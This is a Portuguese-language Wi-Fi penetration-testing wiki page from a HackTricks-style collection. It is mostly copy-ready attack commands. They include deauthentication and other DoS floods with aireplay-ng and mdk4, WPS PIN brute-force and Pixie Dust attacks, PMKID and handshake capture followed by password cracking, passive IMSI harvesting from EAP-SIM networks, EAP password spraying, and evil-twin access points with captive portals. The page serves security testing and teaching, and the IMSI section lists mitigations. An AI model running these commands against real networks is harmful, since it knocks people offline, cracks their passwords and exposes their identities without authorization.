# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos do Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### Hijacker & NexMon (Wi-Fi interno do Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Ele pode realizar ataques Evil Twin, KARMA e Known Beacons e então usar um template de phishing para obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela irá automaticamente:

- Define a interface em monitor mode
- Faz scan por redes possíveis - E permite que você selecione a(s) vítima(s)
- If WEP - Launch WEP attacks
- If WPA-PSK
- If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.
- Tenta capturar o PMKID do AP para crack it
- Tenta deauthenticate clients do AP para capturar um handshake
- If PMKID or Handshake, try to bruteforce using top5000 passwords.

## Resumo dos Ataques

- **DoS**
- Deauthentication/disassociation -- Desconecta todos (ou um específico ESSID/Client)
- Random fake APs -- Hide nets, possible crash scanners
- Overload AP -- Try to kill the AP (usually not very useful)
- WIDS -- Play with the IDS
- TKIP, EAPOL -- Some specific attacks to DoS some APs
- **Cracking**
- Crack **WEP** (várias ferramentas e métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar captive portal creds e/ou realizar LAN attacks
- **WPA-PSK** Evil Twin -- Útil para network attacks se você souber a password
- **WPA-MGT** -- Útil para capturar company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar captive portal creds e/ou realizar LAN attacks
- **+ WPA** -- Útil para capturar WPA handshakes

## DOS

### Pacotes de Deauthentication

**Descrição de** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 é o número de deauths a enviar (você pode enviar múltiplos se quiser); 0 significa enviá-los continuamente
- -a 00:14:6C:7E:40:80 é o endereço MAC do ponto de acesso (AP)
- -c 00:0F:B5:34:30:30 é o endereço MAC do cliente a deauthenticate; se isso for omitido então é enviada broadcast deauthentication (nem sempre funciona)
- ath0 é o nome da interface

### Pacotes de desassociação

**Pacotes de desassociação**, semelhantes aos deauthentication packets, são um tipo de quadro de gerenciamento usado em redes Wi‑Fi. Esses pacotes servem para romper a conexão entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A principal distinção entre desassociação e deauthentication está em seus cenários de uso. Enquanto um AP emite **deauthentication packets para remover explicitamente rogue devices da rede, os pacotes de desassociação são tipicamente enviados quando o AP está sendo desligado**, reiniciado ou deslocado, exigindo assim a desconexão de todos os nós conectados.

**This attack can be performed by mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques DOS por mdk4**

**Em** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envia beacon frames para mostrar fake APs nos clients. Isso pode, às vezes, crashar network scanners e até drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar frames de autenticação para todos os Access Points (APs) acessíveis dentro do alcance pode sobrecarregar esses APs, especialmente quando numerosos clientes estão envolvidos. Esse tráfego intenso pode levar à instabilidade do sistema, fazendo com que alguns APs travem ou até reiniciem.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se um SSID é revelado corretamente e confirma o alcance do AP. Esta técnica, combinada com **bruteforcing hidden SSIDs** com ou sem uma wordlist, ajuda a identificar e acessar redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar pacotes aleatórios ou duplicados para diferentes filas QoS pode acionar Michael Countermeasures em **TKIP APs**, levando a um desligamento do AP por um minuto. Este método é uma tática eficiente de ataque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar um AP com **EAPOL Start frames** cria **sessões falsas**, sobrecarregando o AP e bloqueando clientes legítimos. Alternativamente, injetar **mensagens EAPOL Logoff falsas** desconecta os clientes à força; ambos os métodos interrompem efetivamente o serviço de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Vários ataques ao gerenciamento de links e ao roteamento em redes mesh IEEE 802.11s.

**ATTACK MODE w: WIDS Confusion**

A conexão cruzada de clientes a múltiplos nós WDS ou a rogue APs pode manipular Sistemas de Detecção e Prevenção de Intrusões, causando confusão e potencial abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Um packet fuzzer com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipulação de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos comentários anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica o processo de conectar dispositivos a um router, acelerando e facilitando a configuração em redes criptografadas com **WPA** ou **WPA2** Personal. É ineficaz contra a segurança WEP, facilmente comprometida. WPS utiliza um PIN de 8 dígitos, validado em duas metades, tornando-o suscetível a ataques brute-force devido ao número limitado de combinações (11.000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para realizar esta ação: Reaver e Bully.

- **Reaver** foi projetado para ser um ataque robusto e prático contra WPS, e foi testado contra uma grande variedade de access points e implementações de WPS.
- **Bully** é uma **nova implementação** do ataque brute force ao WPS, escrita em C. Possui várias vantagens sobre o código original do reaver: menos dependências, melhor desempenho de memória e CPU, tratamento correto de endianness, e um conjunto de opções mais robusto.

O ataque explora a vulnerabilidade do **WPS PIN**, particularmente a exposição dos primeiros quatro dígitos e o papel do último dígito como checksum, facilitando o ataque brute-force. Contudo, defesas contra ataques brute-force, como **blocking MAC addresses** de atacantes agressivos, exigem **MAC address rotation** para continuar o ataque.

Ao obter o WPS PIN com ferramentas como Bully ou Reaver, o atacante pode deduzir o WPA/WPA2 PSK, garantindo **acesso persistente à rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

This refined approach targets WPS PINs using known vulnerabilities:

1. **PINs pré-descobertos**: Utilize um banco de dados de PINs conhecidos ligados a fabricantes específicos conhecidos por usar PINs WPS uniformes. Esse banco de dados correlaciona os três primeiros octetos dos endereços MAC com os PINs prováveis para esses fabricantes.
2. **Algoritmos de Geração de PIN**: Leverage algoritmos like ComputePIN and EasyBox, which calculate WPS PINs based on the AP's MAC-address. The Arcadyan algorithm additionally requires a device ID, adding a layer to the PIN generation process.

### WPS Pixie Dust attack

**Dominique Bongard** discovered a flaw in some Access Points (APs) concerning the creation of secret codes, known as **nonces** (**E-S1** and **E-S2**). If these nonces can be figured out, cracking the AP's WPS PIN becomes easy. The AP reveals the PIN within a special code (hash) to prove it's legitimate and not a fake (rogue) AP. These nonces are essentially the "keys" to unlocking the "safe" that holds the WPS PIN. More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In simple terms, the issue is that some APs did not use random enough keys for encrypting the PIN during the connection process. This makes the PIN vulnerable to being guessed from outside the network (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se você não quiser ativar o monitor mode no dispositivo, ou se o `reaver` e o `bully` apresentarem problemas, pode tentar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta ferramenta consegue realizar Pixie Dust attack sem precisar ativar o monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alguns sistemas mal projetados chegam a permitir que um **Null PIN** (um PIN vazio ou inexistente) conceda acesso, o que é bastante incomum. A ferramenta **Reaver** é capaz de testar essa vulnerabilidade, ao contrário do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques propostos a WPS podem ser facilmente realizados usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 permitem que você tente **seu PIN personalizado** (se tiver algum)
- 7 e 8 executam o **Pixie Dust attack**
- 13 permite que você teste o **NULL PIN**
- 11 e 12 irão **recuperar os PINs relacionados ao AP selecionado a partir de bancos de dados disponíveis** e **gerar** possíveis **PINs** usando: ComputePIN, EasyBox e, opcionalmente, Arcadyan (recomendado, por que não?)
- 9 e 10 vão testar **todos os PINs possíveis**

## **WEP**

Tão quebrado e pouco usado hoje em dia. Apenas saiba que _**airgeddon**_ tem uma opção WEP chamada "All-in-One" para atacar esse tipo de proteção. Mais ferramentas oferecem opções similares.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Como o "PMK Name" é constante, conhecemos o BSSID do AP e da estação, e o `PMK` é idêntico ao de uma 4-way handshake completa, o **hashcat** pode usar essa informação para crackar o PSK e recuperar a passphrase!

Para **coletar** essas informações e **bruteforce** localmente a senha, você pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs captured** serão mostrados no **console** e também **salvos** dentro \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato **hashcat/john** e crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, note que o formato de um hash correto contém **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se o seu **apenas** contém **3 partes**, então, é **inválido** (the PMKID capture wasn't valid).

Observe que `hcxdumptool` **também capture handshakes** (algo assim aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Você pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Captura de handshake

Um ataque a redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **crack** o password **offline**. Esse processo envolve monitorar a comunicação de uma rede específica e o **BSSID** em um **channel** particular. Aqui está um guia simplificado:

1. Identifique o **BSSID**, o **channel** e um **cliente conectado** da rede alvo.
2. Use `airodump-ng` para monitorar o tráfego de rede no **channel** e **BSSID** especificados, na tentativa de capturar um **handshake**. O comando será parecido com este:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar as chances de capturar um handshake, desconecte momentaneamente o cliente da rede para forçar uma reautenticação. Isso pode ser feito usando o comando `aireplay-ng`, que envia pacotes de deauthentication para o cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Observe que, como o cliente foi desautenticado, ele pode tentar conectar-se a um AP diferente ou, em outros casos, a outra rede._

Quando no `airodump-ng` aparecerem informações de handshake, isso significa que o handshake foi capturado e você pode parar de escutar:

![](<../../images/image (172) (1).png>)

Uma vez que o handshake foi capturado, você pode **crack**á-lo com `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se há handshake no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do handshake completo, ela não detectará o handshake válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Em **enterprise WiFi setups, você encontrará vários métodos de autenticação**, cada um oferecendo diferentes níveis de segurança e recursos de gerenciamento. Ao usar ferramentas como `airodump-ng` para inspecionar o tráfego de rede, você pode notar identificadores desses tipos de autenticação. Alguns métodos comuns incluem:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método suporta hardware tokens e one-time passwords dentro de EAP-PEAP. Ao contrário de MSCHAPv2, não usa um peer challenge e envia as passwords em plaintext para o access point, representando um risco para downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Envolve o envio do hash MD5 da password pelo cliente. Não é **recomendado** devido à vulnerabilidade a dictionary attacks, falta de server authentication e incapacidade de gerar WEP keys específicas por sessão.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados client-side e server-side para autenticação e pode gerar dinamicamente WEP keys por usuário e por sessão para proteger as comunicações.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornece mutual authentication através de um túnel encriptado, além de um método para derivar WEP keys dinâmicas por usuário e por sessão. Requer apenas certificados server-side, com clientes usando credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma semelhante ao EAP criando um TLS tunnel para comunicação protegida. Permite o uso de protocolos de autenticação mais fracos sobre o EAP devido à proteção oferecida pelo túnel.
- **PEAP-MSCHAPv2**: Frequentemente referido como PEAP, combina o vulnerável mecanismo MSCHAPv2 challenge/response com um TLS tunnel protetor.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Semelhante ao EAP-TLS, mas inicia um TLS tunnel antes de trocar certificados, oferecendo uma camada adicional de segurança.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) e [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se você está usando **EAP** as **"Identity"** **messages** devem ser **supported**, e o **username** será enviado em **clear** nas mensagens **"Response Identity"**.

Mesmo usando um dos métodos de autenticação mais seguros: **PEAP-EAP-TLS**, é possível **capture the username sent in the EAP protocol**. Para isso, **capture a authentication communication** (inicie `airodump-ng` dentro de um channel e `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Response, Identity**", o **username** do cliente irá aparecer.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding é suportado tanto por EAP-PEAP quanto por EAP-TTLS. No contexto de uma rede WiFi, uma EAP-Identity request é tipicamente iniciada pelo access point (AP) durante o processo de associação. Para garantir a proteção do anonimato do usuário, a resposta do EAP client no dispositivo do usuário contém apenas a informação essencial necessária para que o initial RADIUS server processe a request. Este conceito é ilustrado pelos seguintes cenários:

- EAP-Identity = anonymous
- Neste cenário, todos os usuários empregam o pseudônimo "anonymous" como identificador de usuário. O initial RADIUS server funciona como um EAP-PEAP ou EAP-TTLS server, responsável por gerir o server-side do protocolo PEAP ou TTLS. O método de autenticação inner (protected) é então tratado localmente ou delegado a um RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- Nesta situação, usuários de diferentes realms ocultam suas identidades enquanto indicam seus respectivos realms. Isso permite que o initial RADIUS server proxie as EAP-PEAP ou EAP-TTLS requests para RADIUS servers em seus home realms, que atuam como o PEAP ou TTLS server. O initial RADIUS server opera apenas como um RADIUS relay node.
- Alternativamente, o initial RADIUS server pode funcionar como o EAP-PEAP ou EAP-TTLS server e tratar o protected authentication method ou encaminhá-lo para outro servidor. Esta opção facilita a configuração de políticas distintas para vários realms.

No EAP-PEAP, uma vez que o TLS tunnel é estabelecido entre o PEAP server e o PEAP client, o PEAP server inicia uma EAP-Identity request e a transmite através do TLS tunnel. O client responde a essa segunda EAP-Identity request enviando uma EAP-Identity response contendo a identidade real do usuário através do túnel encriptado. Esta abordagem previne efetivamente a revelação da identidade real do usuário a qualquer pessoa que esteja eavesdropping no tráfego 802.11.

EAP-TTLS segue um procedimento ligeiramente diferente. Com EAP-TTLS, o client tipicamente se autentica usando PAP ou CHAP, protegido pelo TLS tunnel. Nesse caso, o client inclui um atributo User-Name e ou um atributo Password ou CHAP-Password na mensagem TLS inicial enviada após o estabelecimento do túnel.

Independentemente do protocolo escolhido, o PEAP/TTLS server obtém conhecimento da identidade real do usuário após o TLS tunnel ter sido estabelecido. A identidade real pode ser representada como user@realm ou simplesmente user. Se o PEAP/TTLS server também for responsável por autenticar o usuário, ele agora possui a identidade do usuário e procede com o método de autenticação protegido pelo TLS tunnel. Alternativamente, o PEAP/TTLS server pode encaminhar uma nova RADIUS request para o home RADIUS server do usuário. Essa nova RADIUS request omite a camada de protocolo PEAP ou TTLS. Nos casos em que o protected authentication method é EAP, as inner EAP messages são transmitidas para o home RADIUS server sem o wrapper EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de saída contém a identidade real do usuário, substituindo o User-Name anonymous da RADIUS request de entrada. Quando o protected authentication method é PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autenticação extraídos do payload TLS são substituídos na RADIUS message de saída, deslocando o User-Name anonymous e os atributos TTLS EAP-Message presentes na RADIUS request de entrada.

Para mais informações, consulte [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication usando EAP‑SIM/EAP‑AKA sobre 802.1X pode leak o identificador permanente do assinante (IMSI) em cleartext durante a fase de unauthenticated identity se a deployment não implementar pseudonyms/protected identities ou um TLS tunnel ao redor do inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Clique para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de qualquer túnel TLS se a implantação usar EAP‑SIM/AKA puro sem identidade protegida/pseudônimos.
- O valor exposto é um identificador permanente vinculado ao SIM do assinante; a coleta permite rastreamento de longo prazo e abusos subsequentes nas telecomunicações.

Impacto
- Privacidade: rastreamento persistente de usuário/dispositivo a partir de capturas passivas de Wi‑Fi em locais públicos.
- Bootstrap de abuso em telecom: com o IMSI, um atacante com acesso a SS7/Diameter pode consultar localização ou tentar interceptação de chamadas/SMS e roubo de MFA.

Mitigações / o que procurar
- Verifique que os clientes usem identidades externas anônimas (pseudônimos) para EAP‑SIM/AKA conforme orientação 3GPP (por exemplo, 3GPP TS 33.402).
- Prefira tunelar a fase de identidade (por exemplo, EAP‑TTLS/PEAP transportando EAP‑SIM/AKA interno) para que o IMSI nunca seja enviado em claro.
- Capturas de pacotes de association/auth nunca devem revelar um IMSI bruto em EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **lista** de **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Você também pode realizar esse ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria de ataques a clientes

### Seleção de Rede e Roaming

- O protocolo 802.11 define como uma estação se associa a um Extended Service Set (ESS), mas não especifica os critérios para selecionar um ESS ou um access point (AP) dentro dele.
- Estações podem fazer roaming entre APs que compartilham o mesmo ESSID, mantendo conectividade ao longo de um prédio ou área.
- O protocolo exige autenticação da estação ao ESS, mas não exige autenticação do AP para com a estação.

### Preferred Network Lists (PNLs)

- As estações armazenam o ESSID de cada rede sem fio à qual se conectam na sua Lista de Redes Preferenciais (PNL), juntamente com detalhes de configuração específicos da rede.
- A PNL é usada para conectar-se automaticamente a redes conhecidas, melhorando a experiência do usuário ao simplificar o processo de conexão.

### Passive Scanning

- APs periodicamente transmitem beacon frames, anunciando sua presença e funcionalidades, incluindo o ESSID do AP, a menos que a transmissão esteja desativada.
- Durante a varredura passiva, as estações escutam por beacon frames. Se o ESSID de um beacon corresponder a uma entrada na PNL da estação, a estação pode conectar-se automaticamente a esse AP.
- Conhecer a PNL de um dispositivo permite uma possível exploração ao imitar o ESSID de uma rede conhecida, enganando o dispositivo para conectar-se a um AP rogue.

### Active Probing

- A sondagem ativa envolve estações enviando probe requests para descobrir APs próximos e suas características.
- probe requests direcionados miram um ESSID específico, ajudando a detectar se uma rede particular está ao alcance, mesmo que seja uma rede oculta.
- Broadcast probe requests têm um campo SSID nulo e são enviadas para todos os APs próximos, permitindo que a estação verifique por qualquer rede preferida sem divulgar o conteúdo de sua PNL.

## AP simples com redirecionamento para Internet

Antes de explicar como executar ataques mais complexos, será explicado **como** simplesmente **criar** um **AP** e **redirecionar** seu **tráfego** para uma interface conectada **à** **Internet**.

Usando `ifconfig -a` verifique que a interface wlan para criar o AP e a interface conectada à Internet estão presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configuração `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Então **set IPs** e **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Em seguida **inicie** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configuração `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Pare processos incômodos**, configure **monitor mode** e **inicie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque evil twin explora a forma como os clientes WiFi reconhecem redes, baseando-se principalmente no nome da rede (ESSID) sem exigir que a base station (access point) se autentique ao cliente. Pontos-chave incluem:

- **Dificuldade de Diferenciação**: Dispositivos têm dificuldade em distinguir entre access points legítimos e rogue access points quando compartilham o mesmo ESSID e tipo de encriptação. Redes reais frequentemente usam múltiplos access points com o mesmo ESSID para estender a cobertura de forma transparente.
- **Roaming do Cliente e Manipulação de Conexão**: O protocolo 802.11 permite que dispositivos façam roaming entre access points dentro da mesma ESS. Atacantes podem explorar isso atraindo um dispositivo a se desconectar da sua base station (access point) atual e conectar-se a uma rogue access point. Isso pode ser conseguido oferecendo um sinal mais forte ou interrompendo a conexão com o access point legítimo através de métodos como deauthentication packets ou jamming.
- **Desafios na Execução**: Executar com sucesso um ataque evil twin em ambientes com múltiplos access points bem posicionados pode ser desafiador. Desconectar (deauthenticate) um único access point legítimo frequentemente resulta na conexão do dispositivo a outro access point legítimo, a menos que o atacante consiga deauthenticate todos os access points próximos ou posicione estrategicamente a rogue access point.

Você pode criar um Open Evil Twin muito básico (sem capacidades de rotear tráfego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Você também pode criar um Evil Twin usando **eaphammer** (observe que para criar evil twins com eaphammer a interface **should NOT be** em **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

